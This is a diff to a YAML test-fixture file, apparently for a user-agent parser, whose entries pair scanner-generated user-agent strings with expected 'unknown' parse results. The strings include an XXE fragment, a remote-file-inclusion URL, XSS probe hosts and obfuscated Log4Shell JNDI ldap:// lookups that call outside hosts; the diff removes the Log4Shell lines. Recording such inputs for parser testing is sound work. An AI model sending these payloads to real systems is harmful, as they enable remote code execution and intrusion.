@@ -1,5 +1,81 @@
 -
   headers:
+    user-agent: OctopusTools/1.0
+  device:
+    architecture: null
+    deviceName: null
+    marketingName: null
+    manufacturer: unknown
+    brand: unknown
+    dualOrientation: null
+    simCount: 0
+    display:
+      width: null
+      height: null
+      touch: false
+      size: null
+    type: unknown
+    ismobile: false
+    istv: false
+    bits: null
+  os:
+    name: null
+    marketingName: null
+    version: null
+    manufacturer: unknown
+    bits: null
+  client:
+    name: null
+    modus: null
+    version: null
+    manufacturer: unknown
+    type: unknown
+    isbot: false
+    bits: null
+  engine:
+    name: null
+    version: null
+    manufacturer: unknown
+-
+  headers:
+    user-agent: 'https://rfi.nessus.org/rfi.txt'
+  device:
+    architecture: null
+    deviceName: null
+    marketingName: null
+    manufacturer: unknown
+    brand: unknown
+    dualOrientation: null
+    simCount: 0
+    display:
+      width: null
+      height: null
+      touch: false
+      size: null
+    type: unknown
+    ismobile: false
+    istv: false
+    bits: null
+  os:
+    name: null
+    marketingName: null
+    version: null
+    manufacturer: unknown
+    bits: null
+  client:
+    name: null
+    modus: null
+    version: null
+    manufacturer: unknown
+    type: unknown
+    isbot: false
+    bits: null
+  engine:
+    name: null
+    version: null
+    manufacturer: unknown
+-
+  headers:
     user-agent: '>]><test><name>&xxe;</name></test>'
   device:
     architecture: null
@@ -3496,7 +3572,7 @@
     manufacturer: unknown
 -
   headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://was-log4shell-${date:yyyy}PcyOKPDIw8qzGeBrG5a5.w.nessus.org}'
+    user-agent: //wasxsscontext8u3m0m.was.tenable.com
   device:
     architecture: null
     deviceName: null
@@ -3534,7 +3610,7 @@
     manufacturer: unknown
 -
   headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://was-log4shell-${date:yyyy}k1rzbc1S9MGDMBf0eMSm.w.nessus.org}'
+    user-agent: //wasxsscontext8q4k6z.was.tenable.com
   device:
     architecture: null
     deviceName: null
@@ -3572,7 +3648,7 @@
     manufacturer: unknown
 -
   headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://was-log4shell-${date:yyyy}i7MizfcSMOAmuJZRiLL3.w.nessus.org}'
+    user-agent: //wasxsscontext8j2f5r.was.tenable.com
   device:
     architecture: null
     deviceName: null
@@ -3610,7 +3686,7 @@
     manufacturer: unknown
 -
   headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://was-log4shell-${date:yyyy}DTZK0Hs0YYZPzhGbkiNV.w.nessus.org}'
+    user-agent: wasxsscontext7x6h7j
   device:
     architecture: null
     deviceName: null
@@ -3648,7 +3724,7 @@
     manufacturer: unknown
 -
   headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://was-log4shell-${date:yyyy}2RlOcPrg8scxGBYAIknC.w.nessus.org}'
+    user-agent: wasxsscontext6d0d7m
   device:
     architecture: null
     deviceName: null
@@ -3686,83 +3762,7 @@
     manufacturer: unknown
 -
   headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://localhost#was-log4shell-${date:yyyy}SupUZCEjBAZhkBQzsm0P.w.nessus.org}'
-  device:
-    architecture: null
-    deviceName: null
-    marketingName: null
-    manufacturer: unknown
-    brand: unknown
-    dualOrientation: null
-    simCount: 0
-    display:
-      width: null
-      height: null
-      touch: false
-      size: null
-    type: unknown
-    ismobile: false
-    istv: false
-    bits: null
-  os:
-    name: null
-    marketingName: null
-    version: null
-    manufacturer: unknown
-    bits: null
-  client:
-    name: null
-    modus: null
-    version: null
-    manufacturer: unknown
-    type: unknown
-    isbot: false
-    bits: null
-  engine:
-    name: null
-    version: null
-    manufacturer: unknown
--
-  headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://localhost#was-log4shell-${date:yyyy}JWR34MFzrntutK27Nlq4.w.nessus.org}'
-  device:
-    architecture: null
-    deviceName: null
-    marketingName: null
-    manufacturer: unknown
-    brand: unknown
-    dualOrientation: null
-    simCount: 0
-    display:
-      width: null
-      height: null
-      touch: false
-      size: null
-    type: unknown
-    ismobile: false
-    istv: false
-    bits: null
-  os:
-    name: null
-    marketingName: null
-    version: null
-    manufacturer: unknown
-    bits: null
-  client:
-    name: null
-    modus: null
-    version: null
-    manufacturer: unknown
-    type: unknown
-    isbot: false
-    bits: null
-  engine:
-    name: null
-    version: null
-    manufacturer: unknown
--
-  headers:
-    user-agent: '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://localhost#was-log4shell-${date:yyyy}jMSxnjEnOpWJ4lrAWEBa.w.nessus.org}'
+    user-agent: wasxsscontext5l7f5y
   device:
     architecture: null
     deviceName: null
